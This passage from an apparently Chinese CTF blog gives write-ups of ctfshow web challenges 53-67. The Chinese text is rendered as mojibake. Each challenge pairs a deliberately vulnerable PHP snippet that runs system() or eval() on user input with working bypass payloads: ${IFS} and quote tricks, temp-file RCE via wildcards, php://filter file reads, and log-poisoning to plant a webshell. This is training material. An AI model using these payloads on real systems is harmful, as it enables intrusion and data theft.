class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†tac,å¯ä»¥ç”¨â€™â€™ç»•è¿‡ï¼Œ   <code>?c=t&#39;&#39;ac$&#123;IFS&#125;fla?.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220907201452990.png"></p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 19:43:42</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹ä¼¼è¿‡æ»¤äº†å¾ˆå¤šï¼Œå…¶å®æ˜¯å¤šè¿‡æ»¤äº†å•å¼•å·ç»•è¿‡ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡å…¶ä»–æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡è¿‡æ»¤</p><p>å…ˆè¿›è¡Œé‡å‘½åflag.phpæ–‡ä»¶ï¼Œç„¶åç›´æ¥è®¿é—®å³å¯</p><p><code>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220908150516823.png"></p><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å­—æ¯ï¼Œè€ƒè™‘ç»å…¸å­—æ¯rce  ,åšä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è¡¨å•ï¼Œåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡<code>.(ç‚¹)</code>å»æ‰§è¡Œæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä¸€èˆ¬æ¥è¯´è¿™ä¸ªæ–‡ä»¶åœ¨linuxä¸‹é¢ä¿å­˜åœ¨<code>/tmp/php??????</code>ä¸€èˆ¬åé¢çš„6ä¸ªå­—ç¬¦æ˜¯éšæœºç”Ÿæˆçš„æœ‰å¤§å°å†™ã€‚ï¼ˆå¯ä»¥é€šè¿‡linuxçš„åŒ¹é…ç¬¦å»åŒ¹é…ï¼‰</p><p>å†™å…¥   è¿›è¡Œï¼ŸåŒ¹é…</p><p><code>?c=.%20/???/????????[@-[]</code>    æœ€åä¸€ä¸ªæ˜¯åŒ¹é…å¤§å†™å­—æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220912112219613.png"></p><p>å¯ä»¥è¿›è¡Œrceäº†ï¼Œæ‰§è¡ŒæˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220912112016225.png"></p><p>ä¿®æ”¹ä¸Šä¼ å†…å®¹ï¼Œæ‰§è¡Œå‘½ä»¤</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220912080117956.png"></p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>åŒweb55</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-08 01:02:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220914150223064.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220914150421139.png"></p><p>æŸ¥çœ‹æºç </p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220914150443452.png"></p><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¦ç”¨å‡½æ•°ï¼Œè¯•ä¸€è¯•ï¼Œç¦ç”¨äº†cat  systemç­‰ï¼Œç”¨    file_get_contents()</p><p>show_source()</p><p><code>c=show_source(&#39;flag.php&#39;);</code></p><p><code>c=echo file_get_contents(&#39;flag.php&#39;);</code>  ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220914191551170.png"></p><h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>åŒweb58ï¼Œè¿˜å¯ä»¥ç”¨includeå‡½æ•°åš</p><p>POSTï¼š c&#x3D;include($_GET[1]);</p><p>GET:   ?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220914200204581.png"></p><p>æœ€åè¿›è¡Œbase64è§£ç </p><h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ³•ä¸€ï¼š"><a href="#æ³•ä¸€ï¼š" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p>ç”¨include()å‡½æ•°ç»•è¿‡    ä¼šå¾—åˆ°ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç å³å¯å¾—åˆ°flag</p><p>POST:  <code>c=echo include($_GET[1]);</code></p><p>GET:   <code>?1=php://filter/convert.base64-encode/resource=flag.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220915191200893.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220915191415895.png"></p><h4 id="æ³•äºŒï¼š"><a href="#æ³•äºŒï¼š" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h4><p>ç”¨show_source();å‡½æ•°    åœ¨POSTè¾“å…¥ <code>c=show_source(&#39;flag.php&#39;);</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220915190952552.png"></p><h3 id="æ³•ä¸‰ï¼š"><a href="#æ³•ä¸‰ï¼š" class="headerlink" title="æ³•ä¸‰ï¼š"></a>æ³•ä¸‰ï¼š</h3><p>ä¼ å…¥shell</p><p>GET:    <code>?1=/var/log/nginx/access.log</code></p><p>POST:    <code>c=include($_GET[1]);&amp;a=echo highlight_file(&#39;flag.php&#39;);</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220915202258018.png" alt="image-20220915202258018"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220915201751618.png" alt="image-20220915201751618"></p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p><h3 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ³•ä¸€ï¼š-1"><a href="#æ³•ä¸€ï¼š-1" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p>ç”¨show_source();å‡½æ•°    åœ¨POSTè¾“å…¥ <code>c=show_source(&#39;flag.php&#39;);</code></p><h4 id="æ³•äºŒï¼š-1"><a href="#æ³•äºŒï¼š-1" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h4><p>ç”¨include()å‡½æ•°ç»•è¿‡    ä¼šå¾—åˆ°ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç å³å¯å¾—åˆ°flag</p><p>POST:  <code>c=echo include($_GET[1]);</code></p><p>GET:   <code>?1=php://filter/convert.base64-encode/resource=flag.php</code></p><p><strong>åŒweb60</strong></p><h4 id="æ³•ä¸‰ï¼š-1"><a href="#æ³•ä¸‰ï¼š-1" class="headerlink" title="æ³•ä¸‰ï¼š"></a>æ³•ä¸‰ï¼š</h4><p>åœ¨POSTè¾“å…¥ï¼š   <code>c=highlight_file(&#39;flag.php&#39;);</code></p><h3 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h3><h4 id="æ³•ä¸€ï¼š-2"><a href="#æ³•ä¸€ï¼š-2" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p>åœ¨POSTè¾“å…¥ï¼š   <code>c=highlight_file(&#39;flag.php&#39;);</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220918192602685.png"></p><h4 id="æ³•äºŒï¼š-2"><a href="#æ³•äºŒï¼š-2" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h4><p>åœ¨POSTè¾“å…¥ï¼š   <code>c=show_source(&#39;flag.php&#39;);</code></p><h4 id="æ³•ä¸‰ï¼š-2"><a href="#æ³•ä¸‰ï¼š-2" class="headerlink" title="æ³•ä¸‰ï¼š"></a>æ³•ä¸‰ï¼š</h4><p>åŒ…å«ä»¥åè¾“å‡º</p><p>åœ¨POSTè¾“å…¥ï¼š  <code>c=include(&#39;flag.php&#39;);echo $flag;</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220918193019098.png"></p><h3 id="web63ï¼š"><a href="#web63ï¼š" class="headerlink" title="web63ï¼š"></a>web63ï¼š</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ62</p><h4 id="æ–°æ–¹æ³•ï¼š"><a href="#æ–°æ–¹æ³•ï¼š" class="headerlink" title="æ–°æ–¹æ³•ï¼š"></a>æ–°æ–¹æ³•ï¼š</h4><p>å…ˆåŒ…å«è¿›å»ï¼Œç„¶åæŸ¥çœ‹æ³¨å†Œå˜é‡</p><p>åœ¨POSTè¾“å…¥ï¼š <code>c=include(&#39;flag.php&#39;);var_dump(get_defined_vars());</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220918193949026.png"></p><h3 id="web64ï¼š"><a href="#web64ï¼š" class="headerlink" title="web64ï¼š"></a>web64ï¼š</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c&#x3D;print_r(scandir(â€˜.â€™));             æŸ¥çœ‹ç›®å½•</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220918194821153.png"></p><p>åŒ63  62</p><h3 id="web65ï¼š"><a href="#web65ï¼š" class="headerlink" title="web65ï¼š"></a>web65ï¼š</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å¯ä»¥ç”¨ä¹‹å‰çš„æ–¹æ³•ç™½å«–</p><h3 id="web66"><a href="#web66" class="headerlink" title="web66:"></a>web66:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç›®å½•  </p><p>åœ¨POSTè¾“å…¥ï¼š<code>c=var_dump(scandir(&#39;.&#39;));</code></p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220919191647415.png" style="zoom:80%;" /><p>è¿”å›ä¸Šçº§ç›®å½•     <code>c=var_dump(scandir(&#39;..&#39;));</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220919192024533.png"></p><p>æŸ¥çœ‹æ ¹ç›®å½•   æ‰¾åˆ°å¯ç–‘æ–‡ä»¶     <code>c=var_dump(scandir(&#39;/&#39;));</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220919192128878.png"></p><p>æ‰“å¼€flag.txt     <code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220919192433140.png"></p><h3 id="web67"><a href="#web67" class="headerlink" title="web67:"></a>web67:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ 